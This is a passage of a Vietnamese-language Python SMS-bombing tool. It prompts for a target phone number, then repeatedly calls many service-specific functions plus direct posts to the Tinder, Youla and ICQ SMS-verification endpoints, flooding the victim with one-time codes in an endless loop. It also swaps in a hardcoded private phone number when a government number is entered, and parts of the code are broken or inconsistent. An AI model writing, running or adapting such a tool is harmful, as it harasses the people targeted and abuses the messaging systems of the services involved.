                      atmonline(phone)
                      print(format_print("-",i))
                      i+=1
                      vay(phone)
                      print(format_print("-",i))
                      i+=1
                      moneyveo(phone)
                      print(format_print("-",i))
                      i+=1
                      call(phone)
                      print(format_print("-",i))
                      i+=1
                      pop(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      tv360(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      meta(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      gkitchen(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      pharmacity(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
                      gkitchen(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      topenland(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      appota(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      mocha(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      vntrip(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
                      tiki(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      moca(phone)
                      print(format_print("-",i))
                      i+=1
                      vay(phone)
                      print(format_print("-",i))
                      i+=1
                      moneyveo(phone)
                      print(format_print("-",i))
                      i+=1
                      call(phone)
                      print(format_print("-",i))
                      i+=1
                      google(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      popeyes(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      best_express(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
                      onlandtech(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      meeyland(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      king_food(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      poca(phone)
                      print(format_print("-",i))
                      i+=1
                      
                      nutifood(phone)
                      print(format_print("-",i))
                      i+=1
                      tienoi(phone)
                      print(format_print("-",i))
                      i+=1                
                      y360(phone)
                      print(format_print("-",i))
                      i+=1
                      a+=1
                      
                      myviettel(phone)
                      print(format_print("-",i))
                      i+=1
                      a+=1
                      
                      facebook(phone)
                      print(format_print("-",i))
                      a+=1
                      i+=1
                      
                      oldfacebook(phone)
                      print(format_print("-",i))
                      a+=1
                      i+=1
                      vay(phone)
                      print(format_print("-",i))
                      i+=1
                      moneyveo(phone)
                      print(format_print("-",i))
                      i+=1
                      call(phone)
                      print(format_print("-",i))
                      i+=1
                      try:
                          print(format_print("$",requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":phone1})))
                          tienoi(phone)
                          print(format_print("-",i))
                          i+=1
                      except:
                          print(format_print("$","Không Thành Công."))
                  #2
                      try:
                          print(format_print("$",requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":phone1})))
                          
                      except:
                          print(format_print("$","Không Thành Công."))
                  #3
                      try:
                          print(format_print("$",requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))))
                          
                      except:
                          print(format_print("$","Không Thành Công."))
              chay()
              os.system('cls')
              Banner()
              print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)
              tung=0
              while tung==0:
                  chay1(phone)
                  os.system('cls')
                  Banner()
                  print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)

def chay():
            global phone
            phone=input(format_input("+","Nhập Số Điện Thoại Cần SPAM: "))
            if phone in sdt:
                print(format_print("$","Cảnh Báo: Bạn Đang Spam Vào Số Chính Phủ, Vui Lòng Dừng Việc Đó Lại, Nếu Có Chuyện Gì Chúng Tôi Sẽ Không Chịu Trách Nhiệm. Lưu Ý Nếu Bạn Còn Tái Phạm Hành Vi Này Nữa Chúng Tôi Sẽ Khóa Key Và Cấm Bạn Dùng Tool Trong Sever Của Chúng Tôi"))
                phone='0364768113'
            phone1='+84'+phone
            a=0
            phone1='+84'+phone
            a=0
            i=0
            while a<2:
                moneyveo(phone)
                print(format_print("-",i))
                i+=1                
                kiotviet(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                nh247(phone)
                print(format_print("-",i))
                i+=1
                oldvayvnd(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                oldloship(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                oldfptshop(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                oldzalopay(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1
                nh247(phone)
                print(format_print("-",i))
                i+=1
                
                oldvayvnd(phone)
                print(format_print("-",i))
                i+=1
                
                oldloship(phone)
                print(format_print("-",i))
                i+=1
                
                oldfptshop(phone)
                print(format_print("-",i))
                i+=1
                
                oldzalopay(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                oldtamo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                vieon(phone)
                print(format_print("-",i))
                i+=1
                
                concung(phone)
                print(format_print("-",i))
                i+=1
                
                vietid(phone)
                print(format_print("-",i))
                i+=1
                
                gotadi(phone)
                print(format_print("-",i))
                i+=1
                
                winmart(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                atmonline(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                pop(phone)
                print(format_print("-",i))
                i+=1
                
                tv360(phone)
                print(format_print("-",i))
                i+=1
                
                meta(phone)
                print(format_print("-",i))
                i+=1
                
                gkitchen(phone)
                print(format_print("-",i))
                i+=1
                
                pharmacity(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                gkitchen(phone)
                print(format_print("-",i))
                i+=1
                
                topenland(phone)
                print(format_print("-",i))
                i+=1
                
                appota(phone)
                print(format_print("-",i))
                i+=1
                
                mocha(phone)
                print(format_print("-",i))
                i+=1
                
                vntrip(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                tiki(phone)
                print(format_print("-",i))
                i+=1
                
                moca(phone)
                print(format_print("-",i))
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                google(phone)
                print(format_print("-",i))
                i+=1
                
                popeyes(phone)
                print(format_print("-",i))
                i+=1
                
                best_express(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                onlandtech(phone)
                print(format_print("-",i))
                i+=1
                
                meeyland(phone)
                print(format_print("-",i))
                i+=1
                
                king_food(phone)
                print(format_print("-",i))
                i+=1
                
                poca(phone)
                print(format_print("-",i))
                i+=1
                
                nutifood(phone)
                print(format_print("-",i))
                i+=1
                tienoi(phone)
                print(format_print("-",i))
                i+=1                
                y360(phone)
                print(format_print("-",i))
                i+=1
                a+=1
                
                myviettel(phone)
                print(format_print("-",i))
                i+=1
                a+=1
                
                facebook(phone)
                print(format_print("-",i))
                a+=1
                i+=1
                
                oldfacebook(phone)
                print(format_print("-",i))
                a+=1
                i+=1
                vay(phone)
                print(format_print("-",i))
                i+=1
                moneyveo(phone)
                print(format_print("-",i))
                i+=1
                call(phone)
                print(format_print("-",i))
                i+=1
                try:
                    print(format_print("$",requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":phone1})))
                    
                except:
                    print(format_print("$","Không Thành Công."))
            #3
                try:
                    print(format_print("$",requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num))))
                    
                except:
                    print(format_print("$","Không Thành Công."))
def admin():
                os.system('cls')
                Banner()
                chay()
                os.system('cls')
                Banner()
                print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)
                tung=0
                while tung==0:
                    chay1(phone)
                    os.system('cls')
                    Banner()
                    print((format_print("*"," Spam Sau Gần 2 Phút, Số Lần Thành Công Là: ")),thanhcong)

choose = 3  # Assigning a value to the choose variable

if choose == 3:
    # Your code here
    Banner1()
    import requests
from time import strftime
print('Chạy tiến trình')
Banner()
check_key()